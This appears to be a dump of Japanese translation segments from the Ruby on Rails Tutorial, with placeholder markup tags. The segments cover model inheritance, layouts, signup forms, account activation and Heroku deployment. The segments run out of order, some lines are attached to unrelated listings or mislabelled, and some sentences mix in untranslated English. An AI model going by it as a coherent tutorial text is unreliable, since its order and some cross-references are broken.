{0}{1}リスト2.13{/1}{/0}と{2}{1}リスト2.14{/1}{/2}を比較してみると、UserモデルとMicropostモデルはいずれも\kode{ActiveRecord::Base}というクラスを継承しています (継承関係は\kode{<}記号で表現されています)。このクラスは、ActiveRecordが提供するベースクラスであり、クラス間のリレーションは{4}{1}図2.16{/1}{/4}のようになります。
{0}リスト2.13{/0} <n><n>{1}\kode{User}クラスにおける継承{3}{/3} {4}app/models/user.rb{/4}{/1}
{0}リスト2.14{/0} <n><n>{1}\kode{Micropost}クラスにおける継承 {3}{/3} {4}app/models/micropost.rb{/4}{/1}
{0}図2.16{/0} {1}UserモデルとMicropostモデルの継承階層{/1}
{0}{1}リスト2.15{/1}{/0}と{2}{1}リスト2.16{/1}{/2}を比較してみると、UsersコントローラとMicropostsコントローラはいずれもApplicationControllerを継承しています。
{0}{1}リスト2.17{/1}{/0}を見ると、\kode{ApplicationController}自身は\kode{ActionController::Base}を継承しています。これはRailsのAction Packというライブラリが提供している、コントローラ用のベースクラスです。
これらのクラス同士の関係を{0}{1}図2.17{/1}{/0}に示します。
{0}クラス2.15{/0} <n><n>{1}\kode{UsersController}クラスにおける継承{3}{/3} {4}app/controllers/users_controller.rb{/4}{/1}
{0}クラス2.16{/0} <n><n>{1}\kode{MicropostsController}クラスにおける継承{3}{/3} {4}app/controllers/microposts_controller.rb{/4}{/1}
{0}クラス2.17{/0} <n><n>{1}\kode{ApplicationController}クラスにおける継承 {3}{/3} {4}app/controllers/application_controller.rb{/4}{/1}
{0}Figure 2.17: {/0}{1}The inheritance hierarchy for the Users and Microposts controllers.{/1}
Railsのコントローラは必ず\kode{ApplicationController}を継承しているので、Applicationコントローラで定義したルールは、アプリケーションのすべてのアクションに反映されます。
リスト\ref{code:toy_user_presence_valications}を次のように更新してください: \kode{FILL_IN}の部分を適切なコードに置き換え、Userモデルの名前属性とメール属性が存在するかどうかのバリデーションを行えるようにします (図\ref{fig:user_presence_validations})。
この章では、Usersリソース用のRESTアクション (表\ref{table:RESTful_users}) のうち、これまで未実装だった\kode{edit}、\kode{update}、\kode{index}、\kode{destroy}アクションを追加し、RESTアクションを完成させます。
まずはユーザーが自分のプロファイルを自分で更新できるようにします。ここで早速{0}{1}第8章{/1}{/0}で実装した認証用のコードを使いますが、これは認可モデルについて説明する自然なキッカケになります。
ユーザー情報を編集するパターンは、({0}{1}第7章{/1}{/0})の新規ユーザーの作成と極めて似通っています。
  end
ユーザー編集ページに対応するビュー を、リスト\ref{code:user_edit_view}に示します (このファイルは手動で作成する必要があります)。
{0}第{1}9{/1}章{/0}では、基本的なUsersリソース (表\ref{table:RESTful_users}の標準的なRESTアクションをすべて使用) と、自由道の高い認証 (authentication) および認可 (authorization) システムを作成しました。
今の状態では、新しくアカウントを登録したユーザーはアカウントに対するフルアクセス権限を持っています ({0}第{1}7{/1}章{/0}) が、このままではいかにも大雑把です。
{p0}の表{p2}を元に、より一般性の高い{3}authenticated?{/3}メソッドを定義することにします。
(これを行うにはリスト{p0}の{2}authenticated?{/2}メソッドを改良する必要があります)。
selfを省略した結果をリスト\ref{code:add_activation_to_users_migration}に示します。
このコードでは、記憶トークンで使用したトークンのメソッドやダイジェストのメソッドをストレートに使いまわしています。リスト{p0}の{2}remember{/2}メソッドと比べてみましょう。
このコールバックがあることで、(リスト{p0}でユーザー登録を行ったときに){2}User.new{/2}で新しいユーザーが定義されると、{2}activation_token{/2}属性や{2}activation_digest{/2}属性を自動的に得られます。後者のactivation_digest属性は既にデータベースのカラムとの関連付けができあがっている (図\ref{fig:user_model_account_activation}) ので、ユーザーが保存されるときに一緒に自動保存されます。
ここまでできれば、リスト{p0}で定義した{2}@user{/2}インスタンス変数、editへの名前付きルート、ERBを組み合わせて、必要なリンクを作成できます (リスト\ref{code:account_activation_view_text}とリスト\ref{code:account_activation_view_html})。
developmentサーバーを再起動してリスト\ref{code:development_email_settings}の設定を読み込んだら、次は{p2}で自動生成したUserメイラーの{3}プレビューファイル{/3}の更新が必要です (リスト\ref{code:generated_user_mailer_previews})。
リスト{p0}で定義した{2}account_activation{/2}の引数には有効な (=実在する) ユーザーオブジェクトを渡す必要があるため、リスト\ref{code:generated_user_mailer_previews}はこのままでは動きません。
ここで、有効化トークンとメールをそれぞれ{0}params[:id]{/0}と{0}params[:email]{/0}で参照できる ({p1}) ことを思い出してみましょう。
リスト\ref{code:signup_with_account_activation_test}の\kode{assigns}メソッドは本チュートリアル初登場です。{3}第{1}8{/1}章{/3}の演習 (\ref{sec:log_in_out_exercises}) で説明したように、\kode{assigns}メソッドを使用すると、対応するアクション内にあるインスタンス変数にアクセスできるようになります。
リスト{p0}の{2}edit{/2}アクションに対応する{2}update{/2}アクションを定義するには、4通りの場合分けに対応する必要があります: パスワード再設定の期限が切れている場合、更新に成功した場合、更新が失敗した場合 (パスワードが正しくないなど)、更新が失敗した場合 (一見更新が成功したように見えるがパスワードが2つとも空欄) です。
\emph{期待どおり}の条件となります。そして条件が満たされるとリスト{p1}の{3}password_reset_expired?{/3}メソッドが実行されます
リスト\ref{code:user_model_password_reset_expired}のコードを使用すると、リスト{p2}の{3}update{/3}アクションが動作するようになります。
(訳注: herokuコマンドのバージョンが古いとここで失敗するかもしれません。その場合は、Heroku Toolbelt ( https://toolbelt.heroku.com/ ) を使って最新版に更新するか、次の古い文法のコマンドを試してみてください: $ heroku addons:add sendgrid:starter ) [BR]<n>[BR]<n>アプリケーションでSendGridアドオンを使用するには、production環境の\href{https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol}{SMTP}に情報を記入する必要があります。
\emph{Railsチュートリアル}のこの後の章では、Twitterのようなマイクロポスト機能 ({1}第{2}11{/2}章{/1}) と、フォロー中のユーザーの投稿のステータスフィード機能 ({3}第{2}12{/2}章{/3}) の基本的な部分をサイトに搭載することにしましょう。
アクション
{0}図5.1{/0} {1}サンプルアプリケーションのHomeページのモックアップ{/1}
{0}{1}第7章{/1}{/0}でサイトにユーザーを追加するときに備えて、最初の\kode{link_to}に仮のリンクを作成します。
2番目の\kode{link_to}では、引数として画像ファイルのパスと任意のオプションハッシュをとる\kode{image_tag}ヘルパーの能力が示されています。シンボルを使用して、この場合は\kode{alt}属性を設定しています。
selfを省略した結果をリスト\ref{code:curl_rails_png}に示します。
リスト{p0}で{2}image_tag{/2}ヘルパーを使っているので、Railsは該当する画像ファイルを、アセットパイプラインを通して{2}app/assets/images/{/2}ディレクトリの中から探してくれます (アセットパイプラインについては\ref{sec:sass_and_the_asset_pipeline}で説明します)。
\kode{image_tag}の効果を確かめるために、ブラウザから生成されたHTMLを見てみましょう
最初に、リスト{p0}で示しているようにBootstrapを追加しましょう。これは、{2}bootstrap-sass{/2} gemを使用してRailsアプリケーションに導入できます。
(ここでは{p0}の途中で紹介した{2}touch{/2}コマンドを使っていますが、ファイルが作成できるなら [新規ファイル作成] や他のコマンドでも問題ありません。)
カスタムCSS用のファイルを作成したら、リスト{p0}のように{2}@import{/2}を使用して、Bootstrap (とそれに関連するSprockets) をインクルードします
導入後、Webサーバを再起動させると、アプリケーションに反映させることができます ({p0}で紹介したように、Ctrl-Cを押してWebサーバを停止させた後、{2}rails server{/2}コマンドを打ってWebサーバを起動してください)。うまくいけば図\ref{fig:sample_app_only_bootstrap}のような結果に
{0}図5.4{/0} {1}スペースや共通スタイルを追加した結果{/1}
言い換えると、\kode{.center}冒頭のドット\kode{.}は、このルールがクラスに対してスタイルを適用することを示しています。
{0}図5.6{/0}{1}デザインされたロゴとサンプルアプリ{/1}
(\kode{shared}ディレクトリは{1}{2}第7章{/2}{/1}で作成します)。
{0}図5.7{/0} {1}Homeページにfooterを追加する{/1}
 *= require_tree .
 *= require_self
 *= require_tree .
 *= require_self
上のようにすることでコードの意味がわかりやすくなり、\kode{about_path}の定義を変えれば\kode{about_path}が使用されているすべてのURLを変更できるため、柔軟性が高まります。
({0}{1}第8章{/1}{/0}で本格的に実装します)。
{0}表 5.1{/0} {1}サイトリンクのルート (routing) とURLのマッピング{/1}
まずは、{0}{1}第3章{/1}{/0}の演習で取り上げたContactページについて追加しましょう。
Contactページのテスト ( \failing {5}{/5}) {6}test/controllers/static_pages_controller_test.rb{/6}
ルートURLのようなルーティングを定義することの効果は、ブラウザからアクセスしやすくすることだけではありません。それ以外にも、生のURLではなく名前付きルートを使ってURLを参照することができるようになります。which is to create named routes that allow us to refer to routes by a name rather than by the raw URL. In this case, these routes are \kode{root_path} and \kode{root_url}, with the only difference being that the latter includes the full URL:
なお、\emph{Railsチュートリアル}では、\kode{_path}書式を使用する一般的な規約に従い、リダイレクトの場合のみ\kode{_url}書式を使用します。
また、ルートURLのときと同様に、\kode{help_path}や\kode{help_url}といった名前付きルートも使えるようになります。
早速、\kode{link_to}メソッドの2番目の引数で、適切な名前付きルートを使ってみましょう。
これで、レイアウトに{0}{1}第3章{/1}{/0}で作成したすべての静的ページへのリンクができました。たとえば\href{http://localhost:3000/about}{/about}の場合はAboutページ (図\ref{fig:about_page}) に移動します。
{0}図5.8{/0} {1}\href{http://localhost:3000/about}{/about}で表示されるAboutページ{/1}
まずは、\kode{site_layout}というテストのテンプレートを生成するところから始めてみます。
このとき、Railsは与えられたファイル名の末尾に \kode{_test} という文字列を追加することに注目してください。
Railsの統合テストでは、上のステップをコードに落とし込んでいくことになります (リスト\ref{code:layout_links_test})。具体的には、まず\kode{assert_template}メソッドを使って、Homeページが正しいビューを描画しているかどうか確かめます
リスト\ref{code:layout_links_test}では、\kode{assert_select}メソッドの高度なオプションを使っています (このメソッド自体はリスト\ref{code:title_tests}やリスト\ref{code:contact_page_test}でも登場しました)。
上のコードでは、Railsは自動的にはてなマーク "?" を\kode{about_path}に置換しています (このとき "about_path" 内に特殊記号があればエスケープ処理されます)。これにより、次のようなHTMLがあるかどうかをチェックすることができます。
\kode{assert_select}には色々な指定の仕方があります。その代表例をいくつか表\ref{table:assert_select}で紹介します。
\kode{assert_select}のいくつかの使用例
統合テストが成功したら、今度はすべてのテストを流して{0}{1}{/1}{1}{2}成功{/2}{/1}{1}{/1}{/0}するかどうか確かめてみてください。
これは、Webサイトでユーザー登録を行えるようにするための最初の重要な一歩となります。次の一歩であるユーザーのモデリングは{0}{1}第6章{/1}{/0}で行い、{2}{1}第7章{/1}{/2}でユーザー登録が完成します。
Userページ用の最初のテスト ({2}{3}{/3}{3}{4}green{/4}{/3}{3}{/3}{/2})
他のルートと同様、\kode{get ’/signup’}と記述したことで\kode{signup_path}という名前付きルートができ、それをリスト\ref{code:home_page_signup_link}で使用します。
これで、少なくともサインインのルートを追加するまでの間、リンクと名前付きルートが完成しました({0}{1}第8章{/1}{/0})。
{0}図5.9{/0} {1}\href{http://localhost:3000/signup}{/signup}で表示される新しいユーザー登録ページ{/1}
リスト{p0}でお見せしたように、Applicationヘルパーで使っている{2}full_title{/2}ヘルパーを、test環境でも使えるようにすると便利です。
この問題を解決するためには、\kode{full_title}ヘルパーに対するテストを書く必要があります。そのために、Applicationヘルパーをテストするファイルを作成し、リスト\ref{code:full_title_helper_tests}の\kode{FILL_IN}のようなコードを書いてみましょう。
ヒント: リスト\ref{code:full_title_helper_tests}では\kode{assert_equal <期待される値>, <実際の値>}といった形で使っていましたが、内部では\kode{==}演算子を使って、期待される値と実際の値を比較して正しいかどうかテストしています。
テスト環境で\kode{full_title}ヘルパーを使う ({3}{4}{/4}{4}{5}green{/5}{/4}{4}{/4}{/3}
\emph{Ruby on Railsチュートリアル}では、一貫したWeb開発技法を学ぶために 3 つのサンプルアプリケーションを作ります。\emph{hello}アプリ (\ref{sec:the_hello_application})、もう少しだけ複雑な\emph{toy}アプリ ({3}第{2}2{/2}章{/3})、実践的な\emph{sample}アプリ ({4}第{2}3{/2}章{/4}から{5}第{2}12{/2}章{/5}まで) です。
次に\kode{hello_app}というRailsアプリの最初のサンプル作成に取りかかります。
第1章の最後には、作成したアプリを早々に本番 (production) 環境 ({p0}) に{2}デプロイして一般公開する{/2}ところまで実践します。
{0}{1}第2章{/1}{/0}では、Railsアプリケーションの基本的な仕組みを体験するために、別のプロジェクトを作成します。
第3章以降では、いよいよ本格的な大規模\emph{サンプルアプリケーション} (\kode{sample_app} )を開発します。自動生成コードは使わずに、ゼロからコードを書き進めます。
サンプルアプリケーションの開発では、「モックアップ」「テスト駆動開発 (TDD)」「統合テスト」の3つの手法を採り入れます。\emph{}\emph{}\emph{}
{0}第{1}3{/1}章{/0}では静的なページを作成し、そこに動的な要素を順次追加していきます。
次の{0}{1}第4章{/1}{/0}では少し回り道をし、Railsを支えているRubyという言語について簡単に学びます。
{0}第{1}5{/1}章{/0}から{2}第{1}10{/1}章{/2}にかけて、レイアウト、ユーザーのデータモデル、ユーザー登録/認証システムを順に作成し、サンプルアプリケーションの基本的な部分を実装します。
\emph{Ruby on Railsチュートリアル}では、より実践的な知識を身につけるために、Scaffoldとほぼ逆のアプローチで開発を進めていきます。具体的には、{1}{2}第2章{/2}{/1}で作成する簡単なデモアプリではscaffoldを使いますが、\emph{このチュートリアル}の中核である{3}{2}第3章以降{/2}{/3}のサンプルアプリケーションからは、scaffoldを一切使わずに開発を進めていきます。
簡素化のため、次のようなUnixスタイルのプロンプト (行の頭に「$」を表示するスタイル) を使用して、その例がコマンドラインであることを示しています。
多少苦労しても構わないのでローカルPC環境で\emph{Ruby on Railsチュートリアル}を学習したいとお考えの方には、\href{http://installrails.com/}{InstallRails.com}{p2}に従って環境を構築することをお勧めします。[NIWATAKO_TIPS]
図\ref{fig:cloud9_new_workspace}に示したように、「rails-tutorial」(「rails_tutorial」に\emph{しない}ようご注意ください) というワークスペース名を入力し、[Private to the people I invite] を選択し、Railsチュートリアルのアイコン (Ruby on Railsのアイコンでは\emph{ありません}) を設定します。
{p0}で推奨しているCloud9 IDEを{2}利用しない{/2}場合は、Railsプロジェクトで使用するための\kode{workspace}ディレクトリを作成しておいてください (リスト \ref{code:mkdir_rails_projects})。 directory for your Rails projects if it doesn’t already exist  and then change into the directory.
{0}{1}リスト1.3{/1}{/0}の下の方にご注目ください。\kode{rails new}を実行すると、ファイルの作成後に\kode{bundle install}コマンドが自動的に実行されています。
Webアプリケーションのディレクトリをどう構成するかは本来自由なのですが、RailsのようなWebフレームワークではディレクトリとファイルの構造 ({0}{1}図1.4{/1}{/0}) はこのように標準化されています。そのおかげで、ディレクトリ構成に悩むことなく、実際に動作するアプリケーションを即座にゼロから作成できるのです。
Railsがデフォルトで作成するファイルについては{0}{1}表1.2{/1}{/0}を参照してください。これらのファイルやディレクトリの目的については本チュートリアル全体に渡って説明いたします。
{0}図1.4 {/0}{1}新規作成されたRailsアプリケーションのディレクトリ構造{/1}
{0}表1.2: {/0} {1}デフォルトのRailsフォルダ構造まとめ。{/1}
Gemfileの内容はRubyのコードですが、ここでは文法を気にする必要はありません。Rubyの詳細については{0}{1}第4章{/1}{/0}で説明します。
\kode{hello_app}ディレクトリにあるデフォルトの\kode{Gemfile}。
{p0}の{2}rails new{/2}コマンドと\ref{sec:the_hello_application}の{2}bundle install{/2}コマンドを実行したことにより、実際に動かすことのできるアプリケーションが作成されました。
まだ始まったばかりですが、今のうちにRailsアプリケーションの全体的な仕組みを知っておくことは後々役立ちます ({0}{1}図1.11{/1}{/0})。
デフォルトのRailsアプリ構造 ({0}{1}図1.4{/1}{/0}) を眺めてみると、\kode{app/}というディレクトリがあり、その中に「\kode{models}」「\kode{views}」「\kode{controllers}」という3つのサブディレクトリがあることに気付いた方もいると思います。
{0}Figure 1.11: {/0}{1}A schematic representation of the model-view-controller (MVC) architecture.{/1}
新しいコントローラの作成は{0}第{1}2{/1}章{/0}で行います。
この時点ではRubyの文法については気にする必要はありません。{0}第{1}4{/1}章{/0}で詳しく解説します。
Applicationコントローラに\kode{hello}を追加する。{3}{/3}{4}app/controllers/application_controller.rb{/4}
ルートルーティングを有効にするには、「#」文字を削除してコメントを解除し、コードを書き換えます (リスト\ref{code:hello_root_route})。これにより、RailsのルートルーティングにアクセスするとApplicationコントローラの\kode{hello}アクションが動作します
ルートルーティングを設定する。{2}{/2}{3}config/routes.rb{/3}
チュートリアル本編ではこのファイルを修正することはありませんが、{p0}に{2}.gitignore{/2}ファイルへの追加例があります。これは、\ref{sec:advanced_testing_setup}で行うオプションの詳細テスト設定の一部です。
({p0}で{2}co{/2}エイリアスを設定した場合は、{2}git co -b modify-README{/2}と入力することもできます)。
続いて、リスト{p0}の内容を{2}README.md{/2}に入力します。
{0}図1.17 {/0}{1}Markdowndでフォーマットされた改良版\kode{README}ファイル{/1}
\kode{bundle install}に特殊なフラグ「--without production」を追加すると、本番用のgem (この場合は\texttt{pg}と\texttt{rails_12factor}) はローカルの環境にはインストールされません。
最初に\href{http://signup.heroku.com/}{Herokuでユーザー登録}します。
デプロイされたアプリケーションの表示は、\kode{heroku create} ({1}リスト1.15{/1}) を実行した際に生成されたアドレスをブラウザで開くだけです (もちろんここに表示されている著者のアドレスではなく、{2}{/2}あなたのアドレスを使ってください)。
次の章では、この{0}第{1}1{/1}章{/0}で学んだことを基礎として、データベースを備えた\emph{toyアプリ}を製作し、Railsでどんなことができるかをさらに詳しく学びます。
リスト{p0}の{2}hello{/2}アクションを書き換え、「hola, mundo!」と表示されるようにしてみましょう
\emph{追加情報}: Railsの表示では「非\href{http://es.wikipedia.org/wiki/ASCII}{ASCII}文字」もサポートされています。「¡Hola, mundo!」にはスペイン語特有の逆さ感嘆符「¡」が含まれています。
リスト{p0}の{2}hello{/2}アクションを複製して、第2のアクション{2}goodbye{/2}を追加しましょう。このアクションは、「goodbye, world!」というテキストを表示します。
{0}{1}第2章{/1}{/0}で簡易的なマイクロポスト投稿フォームに触れましたが、この章では、\ref{sec:microposts_resource}で記述したMicropostデータモデルを作成し、Userモデルと\kode{has_many}および\kode{belongs_to}メソッドを使って関連付けを行い、さらに、結果を処理し表示するために必要なフォームとその部品を作成します (\ref{sec:micropost_images}で画像のアップロードも実装します)。
{0}{1}第12章{/1}{/0}では、マイクロポストの\emph{フィード}を受け取るために、ユーザーを\emph{フォロー}するという概念を導入し、Twitterのミニクローンを完成させます。
{0}String{/0}型でも255文字までは格納できるため、この型でも{p1}で実装する140文字制限を満たせるのですが、{0}Text{/0}型の方が表現豊かなマイクロポストを実現できます。
これにより、モデルのテストは{0}{1}{/1}{1}{2}成功{/2}{/1}{1}{/1}{/0}するようになります。
Micropostモデルの方では、{0}belongs_to :user{/0}というコードが必要になるのですが、これは リスト{p1}のマイグレーションによって自動的に生成されているはずです (リスト\ref{code:micropost_belongs_to_user})。
もちろん、些細なリファクタリングでしかないので、テストは{0}{1}{/1}{1}{2}成功{/2}{/1}{1}{/1}{/0}したままになっているはずです。
そして、アプリケーション側のコードは実装済みなので、これらのテストは{0}{1}{/1}{1}{2}成功{/2}{/1}{1}{/1}{/0}するはずです。
この節では、\emph{ステータスフィード} ({1}{2}第12章{/2}{/1}で完成させます) の最初のヒントをお見せします。
{0}{1}第7章{/1}{/0}では、HTTP \texttt{POST}リクエストをUsersコントローラの\kode{create}アクションに発行するHTMLフォームを作成することで、ユーザーのサインアップを実装しました。
これで、すべてのテストが{0}{1}{/1}{1}{2}成功{/2}{/1}{1}{/1}{/0}するはずです。
これらの追加的なチェック機能をまとめると、リスト\ref{code:jquery_file_test}のようになります。
{0}{1}第12章{/1}{/0}では、そのようなユーザー同士の関係 (リレーションシップ) をモデリングする方法を学び、それがマイクロポストのフィードにどのように関連するかを学びます。
{p0}ではHTML{2}フォーム{/2}を使用して登録情報をWebアプリケーションに送信します。続いて\ref{sec:successful_signups}ではユーザーを新規作成して情報をデータベースに保存します。
本章では、{0}{1}第6章{/1}{/0}で作成したUserモデルのバリデーションを信頼し、有効なメールアドレスを持っている (可能性のある) 新規ユーザーを増やしていきます。
{0}{1}第10章{/1}{/0}では、 メールアドレスが\emph{本当に}有効であることを確かめるために、\emph{アカウントを有効化する}機能をサインアップの手順に追加します。
ユーザープロファイルページの最終的な目標は、図\ref{fig:profile_mockup}のように{p2}ユーザーのプロファイル写真と基本ユーザーデータ、そしてマイクロポストの一覧を表示することです。
このページを作成したら、{0}{1}第12章{/1}{/0}のサンプル・アプリケーションで使用する予定です。
{0}図7.1{/0} {1}この節で作成するユーザープロファイルのモックアップ{/1}
{0}図7.2{/0} {1}理想とする最終的なプロファイルページのモックアップ{/1}
上のように、Railsには\texttt{Rails}というオブジェクトがあり、それには環境の論理値 (boolean) を取る\texttt{env}という属性があります。たとえば、\texttt{Rails.env.test?}はテスト環境では\texttt{true}を返し、それ以外の環境では\texttt{false}を返します。
デバッグ出力をきれいに整形するために、{0}{1}第5章{/1}{/0}で作成したカスタムスタイルシートをリスト{p1}のように追加します。
ここでSassの\emph{ミックスイン}機能 (ここでは\kode{box_sizing}) を使用しています。
{0}図7.3{/0} {1}サンプルアプリケーションのHomeページにデバッグ情報を表示する{/1}
この行に対応するURL、アクション、名前付きルートは{0}{1}表7.1{/1}{/0}のようになります
{0}表7.1{/0} {1}リスト\ref{code:users_resource}のUsersリソースが提供するRESTfulなルート{/1}
{0}図7.5{/0} {1}URL /users/1 のルーティングは有効だがページがない状態{/1}
id={0}1{/0}のユーザーを検索できたのは以上の仕組みによるものです (リスト{p1})。
{0}図7.6{/0} {1}Usersリソース追加後ののユーザー表示ページ{/1}
ここでは、リスト{p0}のように{2}gravatar_for{/2}ヘルパーメソッドを使用してGravatarの画像を利用できるようにします。
デフォルトでは、ヘルパーファイルで定義されているメソッドは自動的にすべてのビューで利用できます。ここでは、利便性を考えて\kode{gravatar_for}をUsersコントローラに関連付けられているヘルパーファイルに置くことにしましょう。
(本チュートリアルでは、リスト\ref{code:email_downcase}のコールバック処理で小文字変換されたメールアドレスを利用しているため、ここで小文字変換を入れなくても結果は同じです。ただし、将来\kode{gravatar_for}メソッドが別の場所から呼びだされる可能性を考えると、ここで小文字変換を入れることには意義があります。)
\kode{gravatar_for}ヘルパーを組み込んだ結果をリスト\ref{code:gravatar_for_helper}に示しました。
\kode{gravatar_for}ヘルパーメソッドを定義する
{0}図7.7{/0} {1}ユーザー表示ページにGravatarのデフォルト画像が表示されている{/1}
リスト\ref{code:sidebar_css}では\kode{.gravatar_edit}というCSSクラスを追加しています。これは{3}{1}第9章{/1}{/3}でも使われます。
{0}図7.10{/0} {1}現状のユーザー登録ページ  \href{http://localhost:3000/signup}{/signup}{/1}
{0}図7.11{/0} {1}ユーザー登録ページのモックアップ{/1}
これを行うには、Railsで\kode{form_for}ヘルパーメソッドを使用します。このメソッドはActive Recordオブジェクトを取り込み、オブジェクトの属性を使用してフォームを構成します。
ユーザー登録ページ /signup のルーティングは、Usersコントローラーの\kode{new}アクションに既に紐付けられていることを思い出してください (リスト\ref{code:signup_route})。したがって、次のステップは、 \kode{form_for}の引数で必要となるUserオブジェクトを作成することになります
\kode{box_sizing}ミックスインをリスト\ref{code:mixin_and_debug}から再利用していることに注目してください。
まずは、埋め込みRubyが使われている\kode{form_for}から\kode{end}までの外側の構造を読み解いていきます。
\kode{do}キーワードは、 \kode{form_for}が1つの変数を持つブロックを取ることを表します。この変数\kode{f}は “form” のfです。
{0}図7.13{/0} {1}\kode{text}フィールドと\kode{password}フィールドに文字を入力した状態{/1}
動作の詳細を知りたい場合は、Stack Overflowの\href{http://stackoverflow.com/questions/941594/understand-rails-authenticity-token}{}Rails信頼性トークン関連の書き込み{/0 (英語) を参照してください。
{0}図7.14{/0} {1}ユーザー登録が失敗したときのモックアップ。{{/1}
このリストでは、{p0}の「パーシャル」のところでも使った{2}render{/2}メソッドを再度使いまわしています。{2}render{2}{/2}{/2}はコントローラのアクションの中でも正常に動作します。
{0}図7.15{/0} {1}ユーザー登録失敗{/1}
{0}図7.16{/0} {1}ユーザー登録失敗時のデバッグ情報{/1}
このハッシュはUsersコントローラに\kode{params}として渡さ{1}{/1}れます。{2}7.1.2{/2}で説明したとおり、この\kode{params}ハッシュ{1}{/1}には各リクエストの情報が含まれています。
以前のバージョンのRailsでは、\kode{モデル}層で\emph{attr_accessible}メソッドを使用することで上のような危険を防止していましたが、 Rails 4.0ではコントローラ層で\emph{Strong Parameters}というテクニックを使用することが推奨されています。
これらのパラメータを使いやすくするために、\kode{user_params}という外部メソッドを使用するのが慣習になっています。このメソッドは適切に初期化したハッシュを返し、\kode{params[:user]}の代わりとして使用されます。
この\kode{user_params}メソッドはUsersコントローラの内部でのみ実行され、Web経由で外部ユーザーにさらされる必要はないため、リスト{p1}に示すようにRubyの\kode{private}キーワードを使って{3}外部から使用できない{/3}ようにします
ちなみに、\kode{private}キーワード以降のコードを強調するために、\kode{user_params}のインデントを1段深くしてあります。
{p0}で少し触れた{2}errors.full_messages{/2}オブジェクトは、 エラーメッセージの配列を持っています。
このメッセージをブラウザで表示するには、ユーザーの\kode{new}ページでエラーメッセージのパーシャル (partial) を出力します。このとき、\kode{form-control}というCSSクラスも一緒に追加することで、Bootstrapがうまく取り扱ってくれるようになります。変更の結果を{1}リスト{2}7.18{/2}に示します。{/1}
ここでは、\kode{’shared/error_messages’}というパーシャルを\kode{render} (レンダリング) している点に注目してください。これはRails全般の慣習で、パーシャルは複数のコントローラにわたるビューに対し、専用の\kode{shared/}ディレクトリを使用するようにしています
{p0}では文字列に対して{2}empty?{/2}メソッドを使用しましたが、Railsのエラーオブジェクトに対しても使用できます。オブジェクトが空の場合は{2}true{/2}、 それ以外の場合は{2}false{/2}を返します。
さらにRailsは、無効な内容で送信がされて元のページに戻されると、\kode{div}で囲まれたエラー用のCSSクラス\kode{field_with_errors}を返します。
これらのメッセージはモデルの検証時に生成されるので、メールアドレスのスタイルやパスワードの最小文字列などを変更すると、メッセージも自動的に変更されます。[BR]<n>[BR]<n>(このとき、存在性のバリデーションもhas_secure_passwordによるバリデーションも空のパスワードを検知してしまうため、ユーザー登録フォームで空のパスワードを入力すると2つの同じエラーメッセージが表示されてしまいます。もちろんこういった冗長なエラーメッセージを直接修正することも可能ですが、幸運にも今回の場合は、後ほど追加する allow_nil: true というオプションでこの問題は解決できます。)
{0}図7.17{/0} {1}ユーザー登録失敗時のエラーメッセージ{/1}
まずは、新規ユーザー登録用の統合テストを生成するところから始めていきます。コントローラーの慣習である「リソース名は複数形」に因んで、統合テストのファイル名は\kode{users_signup}とします。
{p0}の冒頭でデータベースをリセットしてあるので、現時点では{2}User.count{/2}は{2}0{/2}になっています。
\ref{sec:layout_link_tests}のように、 \kode{assert_select}を使って関連ページのHTML要素をテストしていきます。これにより、今後うっかり要素を変更してしまっても気付けるようになります。
フォーム送信をテストするためには、 \texttt{users_path}に対して\kode{POST}リクエストを送信する必要があります (表\ref{table:RESTful_users})。これは、次のように\texttt{post}関数を使って実現できます
これらのコードは等価ではありますが、\kode{assert_no_difference}を使う方が明瞭で、Rubyの慣習的にも正しいです。
なお、送信に失敗したときに\kode{new}アクションが再描画されるはずなので、\kode{assert_template}を使ったテストも含めていることに注意してください。
無効なユーザー登録に対するテスト GREEN{2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
{0}図7.19{/0} {1}ユーザー登録に成功した画面のモックアップ{/1}
実際のアプリケーションコードをリスト{p0}に示します ({2}redirect_to{/2}メソッドに注目してください)。
これはRailsが、\kode{redirect_to @user}というコードから\kode{user_url(@user)}といったコードを実行したいことを(自動的に)推察してくれた結果になります。
もしメールアドレスが既に使用されているというメッセージが表示されたら、{p0}でやったようにRakeの{2}db:migrate:reset{/2}を実行してデータベースをリセットしてください。
{0}図7.22{/0} {1}ユーザー登録が成功し、フラッシュメッセージが表示される{/1}
{0}図7.23{/0} {1}ブラウザでページを再読み込みすると、フラッシュメッセージが表示されなくなる{/1}
今回は\kode{assert_difference}というメソッドを使ってテストを書きます。
リスト{p0}と同じファイルに{2}assert_difference{/2}を使ったテストを追加すると、リスト\ref{code:a_test_for_valid_submission}のようになります。
ここで、users_pathにPOSTリクエストを送信するために、\kode{post_via_redirect}というメソッドを使っていることに注目してください。
有効なユーザー登録に対するテスト GREEN{2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
{0}{1}第3章{/1}{/0}からデプロイをして来ましたが、実際にデータを\emph{操作できるようにする}デプロイは初めてです。そこで、この機会にプロレベルのデプロイ方法について説明していきます。
今回はユーザー登録ページのためだけにSSLを導入しますが、これはWebサイト全体で適用できるため、{0}{1}第8章{/1}{/0}で実装するログイン機構をセキュアにしたり、{p2}で説明する{3}セッションハイジャック{/3}の脆弱性に対しても多くの利点を生み出します。
具体的には、 {0}config{/0}変数で「本番環境ではSSLを強制する」という設定をするだけです (リスト{p1})。
{0}{1}第8章{/1}{/0}では、認証 (authentication) システムを導入し、ユーザーがログインとログアウトをできるようにします。
{0}{1}第9章{/1}{/0}では、どのユーザーも自分のアカウント情報を更新できるようにし、Webサイトの管理者がユーザーを削除できるようにします。それにより、Usersリソースに表\ref{table:RESTful_users}のRESTアクションがすべて実装されるようにします。
\kode{form_for}ヘルパーは、Active Recordのオブジェクトに対応したフォームを生成する
リスト\ref{code:gravatar_option}のコードを使用して、{p2}で定義された{3}gravatar_for{/3}ヘルパーにオプションの{3}size{/3}パラメーターを取ることができる ({3}gravatar_for user, size: 40{/3}のようなコードをビューで使用できる) ことを確認してください。
どのくらい細かくテストするかはお任せします。 リスト\ref{code:flash_test}に最小限のテンプレートを用意しておいたので、参考にしてください (ヒント:  \kode{FILL_IN}メソッドを適切なコードに置き換えると完成します)。
より読みやすくしたリスト\ref{code:layout_flash_content_tag}のコードに対してテストスイートを実行し、こちらも正常に動作することを確認してください。このコードでは、Railsの\kode{content_tag}ヘルパーを使用しています。
\kode{gravatar_for}ヘルパーにキーワード引数を追加する
\kode{content_tag}を使ってレイアウトの中に\kode{flash}を埋め込む
\kode{full_title}ヘルパーのテスト
